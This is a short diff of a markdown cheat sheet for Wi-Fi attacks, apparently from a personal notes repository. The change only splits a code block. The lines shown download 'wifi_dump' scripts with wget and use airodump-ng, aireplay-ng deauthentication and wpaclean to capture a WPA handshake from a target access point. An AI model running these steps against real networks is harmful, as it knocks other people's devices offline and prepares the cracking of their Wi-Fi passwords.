@@ -18,7 +18,9 @@ wget https://raw.githubusercontent.com/gznll/shell/main/wifi/{wifi_dump.sh,pytho
 ### Get AP list
 ```bash
 airodump-ng wlan0 -w out
+```
 
+```bash
 airodump-ng --bssid 11:22:33:44:55:66 --channel 2 wlan0 -w output
 aireplay-ng --deauth 10 -a 11:22:33:44:55:66 wlan0 	
 wpaclean out.cap in.cap
